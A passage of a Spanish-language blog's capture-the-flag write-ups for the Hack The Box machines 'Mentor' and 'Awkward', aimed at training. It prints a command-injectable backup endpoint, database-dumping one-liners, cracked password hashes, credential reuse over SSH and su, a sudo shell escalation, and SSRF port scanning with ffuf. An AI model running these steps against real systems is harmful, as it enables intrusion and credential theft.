Column(\u0026#34;email\u0026#34;, String(50)), Column(\u0026#34;username\u0026#34;, String(50)), Column(\u0026#34;password\u0026#34;, String(128) ,nullable=False) ) # Databases query builder database = Database(DATABASE_URL) /app/app # En admin.py se muestra una segunda direccion de base de datos donde vemos la direccion de backup por la cual obtuvimos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /app/app/api # cat admin.py from fastapi import APIRouter, Depends from app.api.utils import is_admin, is_logged from app.api.models import backup import os router = APIRouter() WORK_DIR = os.getenv(\u0026#39;WORK_DIR\u0026#39;, \u0026#39;/app\u0026#39;) DATABASE_URL = os.getenv(\u0026#39;DATABASE_URL\u0026#39;, \u0026#39;postgresql://postgres:postgres@192.168.1.4/hello_fastapi_dev\u0026#39;) @router.get(\u0026#39;/\u0026#39;, dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False) async def admin_funcs(): return {\u0026#34;admin_funcs\u0026#34;:{\u0026#34;check db connection\u0026#34;:\u0026#34;/check\u0026#34;,\u0026#34;backup the application\u0026#34;: \u0026#34;/backup\u0026#34;}} @router.get(\u0026#39;/check\u0026#39;,dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False) async def check_connection(): return {\u0026#34;details\u0026#34;: \u0026#34;Not implemented yet!\u0026#34;} # Take a backup of the application @router.post(\u0026#34;/backup\u0026#34;,dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False) async def backup(payload: backup): os.system(f\u0026#39;tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)} \u0026amp;\u0026#39;) return {\u0026#34;INFO\u0026#34;: \u0026#34;Done!\u0026#34;} /app/app/api # En users.py las rutas para obtener informacion de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from app.api import crud from app.api.models import token, userDB, userSchema from app.api.utils import is_admin, is_logged, is_a_user from .utils import * from fastapi import APIRouter, HTTPException, Header, Path, FastAPI, Depends, Request from typing import List import os router = APIRouter() SECRET = os.getenv(\u0026#39;SECRET\u0026#39;) # List users @router.get(\u0026#39;/\u0026#39;,response_model=List[userDB], status_code=201, dependencies=[Depends(is_logged), Depends(is_admin)]) async def get_users(request: Request): return await crud.get_users() # List user by id @router.get(\u0026#39;/{id}/\u0026#39;,response_model=userDB, status_code=201, dependencies=[Depends(is_logged), Depends(is_admin)]) async def get_user_by_id(request: Request,id: int = Path(...,gt=0)): user = await crud.get_user(id) if not user: raise HTTPException(status_code=404, detail=\u0026#34;user not found\u0026#34;) return user # Add a new user @router.post(\u0026#34;/add\u0026#34;, response_model=userDB, status_code=201, dependencies=[Depends(is_logged), Depends(is_admin)]) async def create_user(payload: userSchema): user = await is_a_user(payload) if user is None: pass else: raise HTTPException(status_code=424, detail=\u0026#34;User already exists! \u0026#34;) user_id = await crud.create_user(payload) res = { \u0026#34;id\u0026#34; : user_id, \u0026#34;email\u0026#34; : payload.email, \u0026#34;username\u0026#34; : payload.username } return res En el directorio del usuario svc encontramos nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 /app # cd /home /home # ls svc /home # cd svc /home/svc # ls user.txt /home/svc # cat user.txt d57c5e2b32aa7f2d0bf85dca62da4c53 /home/svc # User - svc Postgresql En el contenedor de docker esta instalada la libreria de sqlalchemy, utilizamos esta junto a las credenciales postgres que encontramos anteriormente para ejecutar queries en la base de datos mentorquotes_db.\n1 2 3 4 5 6 7 8 # Queries python -c \u0026#39;from sqlalchemy import create_engine; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); result = engine.execute(\u0026#34;\u0026lt;QUERY\u0026gt;\u0026#34;); a = [i for i in result]; print(a);\u0026#39; # Tablas python -c \u0026#39;from sqlalchemy import create_engine; from sqlalchemy import inspect; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); insp = inspect(engine); t = insp.get_table_names(); print(t);\u0026#39; # Columnas python -c \u0026#39;from sqlalchemy import create_engine; from sqlalchemy import inspect; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); insp = inspect(engine); t = insp.get_columns(\u0026#34;users\u0026#34;); print(t);\u0026#39; Enumeramos las tablas, encontramos tres.\n1 2 3 4 5 6 7 8 9 10 11 /app/app/api # python -c \u0026#39;from sqlalchemy import create_engine; from sqlalchemy import inspect; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); insp = inspect(engine); t = insp.get_table_names(); print(t);\u0026#39; 2023-03-04 01:11:50,290 INFO sqlalchemy.engine.Engine select pg_catalog.version() 2023-03-04 01:11:50,290 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:11:50,291 INFO sqlalchemy.engine.Engine select current_schema() 2023-03-04 01:11:50,291 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:11:50,292 INFO sqlalchemy.engine.Engine show standard_conforming_strings 2023-03-04 01:11:50,292 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:11:50,294 INFO sqlalchemy.engine.Engine SELECT c.relname FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace WHERE n.nspname = %(schema)s AND c.relkind in (\u0026#39;r\u0026#39;, \u0026#39;p\u0026#39;) 2023-03-04 01:11:50,294 INFO sqlalchemy.engine.Engine [generated in 0.00017s] {\u0026#39;schema\u0026#39;: \u0026#39;public\u0026#39;} [\u0026#39;users\u0026#39;, \u0026#39;quotes\u0026#39;, \u0026#39;cmd_exec\u0026#39;] /app/app/api # Las columnas de la tabla users, las cuales son cuatro: id, email, username y password.\n1 2 3 4 5 6 7 8 9 10 11 12 /app/app/api # python -c \u0026#39;from sqlalchemy import create_engine; from sqlalchemy import inspect; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); insp = inspect(engine); t = insp.get_columns(\u0026#34;users\u0026#34;); print(t);\u0026#39; 2023-03-04 01:14:16,121 INFO sqlalchemy.engine.Engine select pg_catalog.version() 2023-03-04 01:14:16,121 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:14:16,122 INFO sqlalchemy.engine.Engine select current_schema() 2023-03-04 01:14:16,122 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:14:16,123 INFO sqlalchemy.engine.Engine show standard_conforming_strings 2023-03-04 01:14:16,123 INFO sqlalchemy.engine.Engine [raw sql] {} [.. snip ..] [{\u0026#39;name\u0026#39;: \u0026#39;id\u0026#39;, \u0026#39;type\u0026#39;: INTEGER(), \u0026#39;nullable\u0026#39;: False, \u0026#39;default\u0026#39;: \u0026#34;nextval(\u0026#39;users_id_seq\u0026#39;::regclass)\u0026#34;, \u0026#39;autoincrement\u0026#39;: True, \u0026#39;comment\u0026#39;: None}, {\u0026#39;name\u0026#39;: \u0026#39;email\u0026#39;, \u0026#39;type\u0026#39;: VARCHAR(length=50), \u0026#39;nullable\u0026#39;: True, \u0026#39;default\u0026#39;: None, \u0026#39;autoincrement\u0026#39;: False, \u0026#39;comment\u0026#39;: None}, {\u0026#39;name\u0026#39;: \u0026#39;username\u0026#39;, \u0026#39;type\u0026#39;: VARCHAR(length=50), \u0026#39;nullable\u0026#39;: True, \u0026#39;default\u0026#39;: None, \u0026#39;autoincrement\u0026#39;: False, \u0026#39;comment\u0026#39;: None}, {\u0026#39;name\u0026#39;: \u0026#39;password\u0026#39;, \u0026#39;type\u0026#39;: VARCHAR(length=128), \u0026#39;nullable\u0026#39;: False, \u0026#39;default\u0026#39;: None, \u0026#39;autoincrement\u0026#39;: False, \u0026#39;comment\u0026#39;: None}] /app/app/api # Obtuvimos los datos de la tabla users.\n1 2 3 4 5 6 7 8 9 10 11 12 /app/app/api # python -c \u0026#39;from sqlalchemy import create_engine; engine = create_engine(\u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;, echo=True); result = engine.execute(\u0026#34;select * from users;\u0026#34;); print(type(result)); a = [i for i in result]; print(a);\u0026#39; 2023-03-04 01:17:51,666 INFO sqlalchemy.engine.Engine select pg_catalog.version() 2023-03-04 01:17:51,666 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:17:51,667 INFO sqlalchemy.engine.Engine select current_schema() 2023-03-04 01:17:51,667 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:17:51,668 INFO sqlalchemy.engine.Engine show standard_conforming_strings 2023-03-04 01:17:51,668 INFO sqlalchemy.engine.Engine [raw sql] {} 2023-03-04 01:17:51,669 INFO sqlalchemy.engine.Engine select * from users; 2023-03-04 01:17:51,669 INFO sqlalchemy.engine.Engine [raw sql] {} \u0026lt;class \u0026#39;sqlalchemy.engine.cursor.LegacyCursorResult\u0026#39;\u0026gt; [(1, \u0026#39;james@mentorquotes.htb\u0026#39;, \u0026#39;james\u0026#39;, \u0026#39;7ccdcd8c05b59add9c198d492b36a503\u0026#39;), (2, \u0026#39;svc@mentorquotes.htb\u0026#39;, \u0026#39;service_acc\u0026#39;, \u0026#39;53f22d0dfa10dce7e29cd31f4f953fd8\u0026#39;)] /app/app/api # crackstation nos muestra unicamente el hash de service_acc.\n1 2 7ccdcd8c05b59add9c198d492b36a503 53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani Shell Utilizamos estas credenciales en el servicio SSH con el nombre de usuario svc. Logrando obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ➜ mentor ssh svc@mentorquotes.htb # 123meunomeeivani svc@mentorquotes.htb\u0026#39;s password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Jan 9 02:06:01 AM UTC 2023 System load: 0.0234375 Usage of /: 64.9% of 8.09GB Memory usage: 15% Swap usage: 0% Processes: 259 Users logged in: 0 IPv4 address for br-028c7a43f929: 172.20.0.1 IPv4 address for br-24ddaa1f3b47: 172.19.0.1 IPv4 address for br-3d63c18e314d: 172.21.0.1 IPv4 address for br-7d5c72654da7: 172.22.0.1 IPv4 address for br-a8a89c3bf6ff: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.193 =\u0026gt; There are 18 zombie processes. 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40 svc@mentor:~$ whoami;id;pwd svc uid=1001(svc) gid=1001(svc) groups=1001(svc) /home/svc svc@mentor:~$ User - James Enumerando los archivos de configuracion de snmp encontramos credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 svc@mentor:/etc/snmp$ ls snmp.conf snmpd.conf snmpd.conf.d svc@mentor:/etc/snmp$ cat snmpd.conf | grep -v \u0026#34;#\u0026#34; sysLocation Sitting on the Dock of the Bay sysContact Me \u0026lt;admin@mentorquotes.htb\u0026gt; sysServices 72 master agentx agentAddress udp:161,udp6:[::1]:161 view systemonly included .1.3.6.1.2.1.1 view systemonly included .1.3.6.1.2.1.25.1 rocommunity public default -V systemonly rocommunity6 public default -V systemonly rouser authPrivUser authpriv -V systemonly includeDir /etc/snmp/snmpd.conf.d createUser bootstrap MD5 SuperSecurePassword123__ DES rouser bootstrap priv com2sec AllUser default internal group AllGroup v2c AllUser view SystemView included .1.3.6.1.2.1.25.1.1 view AllView included .1 access AllGroup \u0026#34;\u0026#34; any noauth exact AllView none none svc@mentor:/etc/snmp$ Utilizamos esta con el usuario james la cual funciono correctamente.\n1 2 3 4 5 6 7 8 svc@mentor:/etc/snmp$ su james Password: james@mentor:/etc/snmp$ cd james@mentor:~$ ls james@mentor:~$ whoami;id james uid=1000(james) gid=1000(james) groups=1000(james) james@mentor:~$ Privesc Tras ejecutar sudo -l -l observamos que el usuario james puede ejecutar sh como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 james@mentor:~$ sudo -l -l [sudo] password for james: Matching Defaults entries for james on mentor: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User james may run the following commands on mentor: Sudoers entry: RunAsUsers: ALL Commands: /bin/sh james@mentor:~$ sudo sh # whoami;id root uid=0(root) gid=0(root) groups=0(root) # cd # ls logins.log root.txt scripts snap # cat root.txt ed605945a5870ecc993bda7574b545b1 # ","description":"Mentor expone el servicio snmp y una API la cual enumeramos, en esta ultima encontramos una vulnerabilidad de Command Injection la cual nos permitio acceder a un contenedor de docker. Una vez dentro, descubrimos credenciales en la base de datos postgres, con ello logramos acceder a un primer usuario por SSH. Accedimos a un segundo usuario con la configuracion del servicio snmp que, finalmente nos permitio escalar privilegios como root.","id":4,"section":"posts","tags":["snmp","snmp-check","wfuzz","api","command injection","docker","sqlalchemy","postgres","sudo privesc"],"title":"Hack The Box - Mentor","uri":"https://sckull.github.io/posts/mentor/"},{"content":"\rEn Awkward descubrimos codigo VueJs del sitio, tras analizar y explorar la API, explotamos una vulnerabilidad SSRF que nos dio acceso a la documentación de la API, luego, realizar lectura de archivos modificando el token JWT del sitio, con ello, obtener credenciales dentro de un backup y acceso por SSH. Tras el monitoreo de los procesos y comportamiento del sitio web, observamos que un script realizaba el envio de un email como root tras modificar un archivo csv, este ultimo es accesible por el sitio web el cual nos permitió unicamente la lectura de archivos por la existencia de un filtro, para saltarlo obtuvimos acceso al usuario www-data el cual permitia la escritura del csv que posteriormente nos permitió escalar privilegios.\nNombre Awkward OS Linux Puntos 30 Dificultad Media IP 10.10.11.185 Maker coopertim13\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.5, 5.5, 4.8, 5.2, 4.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 4, 3, 7, 6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Mon Nov 7 23:14:32 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.185 Nmap scan report for 10.10.11.185 (10.10.11.185) Host is up (0.062s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA) |_ 256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 7 23:14:42 2022 -- 1 IP address (1 host up) scanned in 9.62 seconds Web Site El sitio web redirige al dominio hat-valley.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ┌──(kali㉿kali)-[~/htb/awkward] └─$ curl -sI 10.10.11.185 HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Tue, 08 Nov 2022 04:14:55 GMT Content-Type: text/html Content-Length: 132 Last-Modified: Thu, 15 Sep 2022 12:33:07 GMT Connection: keep-alive ETag: \u0026#34;63231b83-84\u0026#34; Accept-Ranges: bytes ┌──(kali㉿kali)-[~/htb/awkward] └─$ curl -s 10.10.11.185 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Refresh\u0026#34; content=\u0026#34;0; url=\u0026#39;http://hat-valley.htb\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Se muestra información sobre gorros, sombreros, etc.\nWappalyzer muestra multiples tecnologías utilizadas por el sitio.\nSubdominios Utilizamos ffuf para enumerar los distintos subdominios, observamos el subdominio store.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ➜ awkward ffuf -c -w bitquark-subdomains-top100000.txt -u http://hat-valley.htb -H \u0026#34;Host: FUZZ.hat-valley.htb\u0026#34; -fs 132 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb :: Wordlist : FUZZ: bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.hat-valley.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 132 ________________________________________________ store [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 133ms] :: Progress: [100000/100000] :: Job [1/1] :: 113 req/sec :: Duration: [0:14:14] :: Errors: 0 :: ➜ awkward Tras realizar la visita a este, pregunta por credenciales de acceso.\nVue App App En el dominio principal, utilizando las herramientas de desarrollador de Firefox, logramos observar parte del codigo fuente de VueJS.\nEn el archivo de rutas observamos cuatro principales:/,/hr,/dashboard, /leave. Además de que utiliza la cookie token con valor guest. Si observamos se realiza una validación del valor del token, en caso de que no sea guest, lo redirige sin más a /dashboard dandole acceso completo a esta ruta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import { createWebHistory, createRouter } from \u0026#34;vue-router\u0026#34;; import { VueCookieNext } from \u0026#39;vue-cookie-next\u0026#39; import Base from \u0026#39;../Base.vue\u0026#39; import HR from \u0026#39;../HR.vue\u0026#39; import Dashboard from \u0026#39;../Dashboard.vue\u0026#39; import Leave from \u0026#39;../Leave.vue\u0026#39; const routes = [ { path: \u0026#34;/\u0026#34;, name: \u0026#34;base\u0026#34;, component: Base, }, { path: \u0026#34;/hr\u0026#34;, name: \u0026#34;hr\u0026#34;, component: HR, }, { path: \u0026#34;/dashboard\u0026#34;, name: \u0026#34;dashboard\u0026#34;, component: Dashboard, meta: { requiresAuth: true } }, { path: \u0026#34;/leave\u0026#34;, name: \u0026#34;leave\u0026#34;, component: Leave, meta: { requiresAuth: true } } ]; const router = createRouter({ history: createWebHistory(), routes, }); router.beforeEach((to, from, next) =\u0026gt; { if((to.name == \u0026#39;leave\u0026#39; || to.name == \u0026#39;dashboard\u0026#39;) \u0026amp;\u0026amp; VueCookieNext.getCookie(\u0026#39;token\u0026#39;) == \u0026#39;guest\u0026#39;) { //if user not logged in, redirect to login next({ name: \u0026#39;hr\u0026#39; }) } else if(to.name == \u0026#39;hr\u0026#39; \u0026amp;\u0026amp; VueCookieNext.getCookie(\u0026#39;token\u0026#39;) != \u0026#39;guest\u0026#39;) { //if user logged in, skip past login to dashboard next({ name: \u0026#39;dashboard\u0026#39; }) } else { next() } }) export default router; En el apartado de services/ descubrimos la dirección de una api con distintas rutas.\n/api/all-leave /api/submit-leave /api/login /api/staff-details /api/store-status services/*.js\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import axios from \u0026#39;axios\u0026#39; axios.defaults.withCredentials = true const baseURL = \u0026#34;/api/\u0026#34; const get_all = () =\u0026gt; { return axios.get(baseURL + \u0026#39;all-leave\u0026#39;) .then(response =\u0026gt; response.data) } const submit_leave = (reason, start, end) =\u0026gt; { return axios.post(baseURL + \u0026#39;submit-leave\u0026#39;, {reason, start, end}) .then(response =\u0026gt; response.data) } export default { get_all, submit_leave } 1 2 3 4 5 6 7 8 9 10 11 12 import axios from \u0026#39;axios\u0026#39; axios.defaults.withCredentials = true const baseURL = \u0026#34;/api/\u0026#34; const login = (username, password) =\u0026gt; { return axios.post(baseURL + \u0026#39;login\u0026#39;, {username, password}) .then(response =\u0026gt; response.data) } export default { login } 1 2 3 4 5 6 7 8 9 10 11 12 import axios from \u0026#39;axios\u0026#39; axios.defaults.withCredentials = true const baseURL = \u0026#34;/api/\u0026#34; const staff_details = () =\u0026gt; { return axios.get(baseURL + \u0026#39;staff-details\u0026#39;) .then(response =\u0026gt; response.data) } export default { staff_details } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import axios from \u0026#39;axios\u0026#39; axios.defaults.withCredentials = true const baseURL = \u0026#34;/api/\u0026#34; const store_status = (URL) =\u0026gt; { const params = { url: {toJSON: () =\u0026gt; URL} } return axios.get(baseURL + \u0026#39;store-status\u0026#39;, {params}) .then(response =\u0026gt; response.data) } export default { store_status } El codigo fuente de la tienda.\nstore.js\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import { createStore } from \u0026#39;vuex\u0026#39;; const store = createStore({ state: { token: null, firstName: null }, mutations: { change(state, theChange) { state[theChange.name] = theChange.value }, arrayItemChange(state, theChange) { state[theChange.name][theChange.index] = theChange.value } }, getters: { token: state =\u0026gt; state.token, firstName: state =\u0026gt; state.firstName } }) export default store Finalmete el codigo de main.js donde destaca la imagen y nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import { createApp } from \u0026#39;vue\u0026#39; import { VueCookieNext } from \u0026#39;vue-cookie-next\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import router from \u0026#39;./router/router\u0026#39; import store from \u0026#34;./store/store\u0026#34; import \u0026#39;@fortawesome/fontawesome-free/css/all.css\u0026#39; import \u0026#39;@fortawesome/fontawesome-free/js/all.js\u0026#39; const app = createApp(App) app.use(VueCookieNext) app.use(router) app.use(store) if(localStorage.getItem(\u0026#34;firstName\u0026#34;)) { store.commit(\u0026#39;change\u0026#39;, { name: \u0026#34;firstName\u0026#34;, value: localStorage.getItem(\u0026#34;firstName\u0026#34;) }) } else { localStorage.clear() } const mixins = { methods: { getUserImg(name) { return require(\u0026#39;./static/\u0026#39; + name.split(\u0026#34;.\u0026#34;)[0] + \u0026#34;-crop.png\u0026#34;) }, getImg() { if(localStorage.getItem(\u0026#34;firstName\u0026#34;)) { try { return require(\u0026#39;./static/\u0026#39; + localStorage.getItem(\u0026#34;firstName\u0026#34;).toLowerCase() + \u0026#34;-crop.png\u0026#34;) } catch(error) { return \u0026#34;\u0026#34; } } else { return \u0026#34;\u0026#34; } }, } } app.mixin(mixins) app.mount(\u0026#39;#app\u0026#39;) API - Users Ralizamos solicitudes a todas las rutas de la API que encontramos, observamos en /staff-details nombres de usuarios y hashes de contraseñas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ➜ awkward curl -s http://hat-valley.htb/api/staff-details | jq [ { \u0026#34;user_id\u0026#34;: 1, \u0026#34;username\u0026#34;: \u0026#34;christine.wool\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649\u0026#34;, \u0026#34;fullname\u0026#34;: \u0026#34;Christine Wool\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;Founder, CEO\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;0415202922\u0026#34; }, { \u0026#34;user_id\u0026#34;: 2, \u0026#34;username\u0026#34;: \u0026#34;christopher.jones\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1\u0026#34;, \u0026#34;fullname\u0026#34;: \u0026#34;Christopher Jones\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;Salesperson\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;0456980001\u0026#34; }, { \u0026#34;user_id\u0026#34;: 3, \u0026#34;username\u0026#34;: \u0026#34;jackson.lightheart\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436\u0026#34;, \u0026#34;fullname\u0026#34;: \u0026#34;Jackson Lightheart\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;Salesperson\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;0419444111\u0026#34; }, { \u0026#34;user_id\u0026#34;: 4, \u0026#34;username\u0026#34;: \u0026#34;bean.hill\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f\u0026#34;, \u0026#34;fullname\u0026#34;: \u0026#34;Bean Hill\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;System Administrator\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;0432339177\u0026#34; } ] ➜ awkward CrackStation unicamente nos muestra la contraseña de uno de los hashes.\n1 2 3 4 6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649 e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123 b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436 37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f Con ello obtuvimos credenciales de un usuario.\n1 christopher.jones:chris123 Web App Al visitar la ruta /hr nos muestra un formulario para el login.\nTras intentar ingresar con usuarios no válidos se muestra un mensaje, y en la solicitud observamos que se crea la cookie token con valor guest tal y como se muestra en el codigo fuente.\nTras modificar el valor de la cookie nos redirige hacia el dashboard, tal y como se muestra en routes.js.\nEntre las distintas rutas visitadas dentro del sitio se observa que realiza una solicitud a la API enviando una direccion url.\nObservamos un error, menciona JWT, seguramente por parte del backend espera un token/cookie de este tipo, además el directorio del sitio.\nObservamos que al crear un nuevo Leave Request nos muestra nuevamente un error de JWT.\nAuth - Christopher Con las credenciales encontradas ingresamos como christopher, esta vez nos muestra información de varios usuarios.\nAdemás observamos que se agregó un valor de cookie jwt.\nAl visitar la ruta de Leaves se muestra información relacionada a este usuario.\nAsi mismo al enviar un nuevo Leave este se agrega a la lista ya existente.\nToken JWT Tras observar la estructura del token intelntamos modificar el valor del usuario a bean.hill.\nSin embargo, como se esperaba, tras enviar una solicitud nueva con este token nos muestra error en la firma, por lo que necesitamos saber el valor del SECRET para crear o modificar el token.\nSSRF Anteriormente mencionamos sobre una solicitud http realizada a una dirección de la API, al verificar dicha solicitud observamos que devuelve el contenido HTML de la dirección enviada, en este caso el localhost. Intentamos distintas formas para realizar lectura de archivos pero unicamente realiza solicitudes http.\nPort scanning Utilizamos ffuf para realizar una enumeración de puertos utilizando solicitudes http. Tras finalizar encontramos los puertos 80, 3002 y 8080 abiertos, localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ➜ awkward ffuf -w num.txt -u \u0026#39;http://hat-valley.htb/api/store-status?url=\u0026#34;http://127.0.0.1:FUZZ\u0026#34;\u0026#39; -b \u0026#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwMTA0MjgwfQ.7ElBGGx3YjXFTkaCRTMsuWRpluCgUdZ2DhcwWRFA-4A\u0026#39; -fs 0 /\u0026#39;___\\ 